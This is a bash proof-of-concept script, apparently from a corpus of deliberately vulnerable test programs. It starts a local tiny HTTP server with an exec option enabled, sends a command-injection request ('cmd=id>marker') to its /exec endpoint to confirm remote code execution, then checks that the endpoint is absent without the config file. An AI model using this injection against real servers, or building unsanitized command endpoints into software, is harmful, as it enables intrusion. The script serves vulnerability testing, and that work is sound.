#!/usr/bin/env bash
# PoC for 125_tinyhttpd_C2I3S1
# Axes: C2 (config file gate) / I3 (struct dispatch) / S1 (no sanitization)
#
# Usage: ./PoC.sh

set -euo pipefail

SAMPLE_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY="$SAMPLE_DIR/httpd"
WWWROOT="/tmp/poc_125_www"
MARKER="/tmp/poc_125_marker"
CONF="/tmp/poc_125.conf"
PORT=18125

if [[ ! -x "$BINARY" ]]; then
    echo "[-] binary not found at $BINARY — run build.sh first" >&2
    exit 1
fi

SERVER_PID=0

cleanup() {
    [[ $SERVER_PID -ne 0 ]] && { kill "$SERVER_PID" 2>/dev/null || true; wait "$SERVER_PID" 2>/dev/null || true; }
    rm -rf "$WWWROOT" "$MARKER" "$CONF"
}
trap cleanup EXIT

mkdir -p "$WWWROOT/htdocs"

# Create config file that enables the exec gate
cat > "$CONF" <<EOF
exec_mode = 1
exec_logging = 1
EOF

# Start server WITH config file
echo "[*] starting httpd with --config on port $PORT..."
(cd "$WWWROOT" && "$BINARY" --port "$PORT" --config "$CONF") &
SERVER_PID=$!
sleep 0.4

# Trigger exploit
echo "[*] sending payload: cmd=id>$MARKER"
curl -sf "http://127.0.0.1:${PORT}/exec?cmd=id>${MARKER}" > /dev/null

# Verify RCE
if [[ -f "$MARKER" ]]; then
    echo "[+] RCE confirmed. Server executed:"
    cat "$MARKER"
else
    echo "[-] marker file not found — exploit failed"
    exit 1
fi

# Negative control: start WITHOUT config file
echo "[*] verifying gate: endpoint must be absent without --config..."
NEG_PID=0
(cd "$WWWROOT" && "$BINARY" --port $((PORT+1000))) &
NEG_PID=$!
sleep 0.4
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:$((PORT+1000))/exec?cmd=id" || echo "000")
kill "$NEG_PID"; wait "$NEG_PID" 2>/dev/null || true
if [[ "$HTTP_CODE" == "404" ]]; then
    echo "[+] gate check passed: got 404 without --config"
else
    echo "[!] gate check: got $HTTP_CODE"
fi
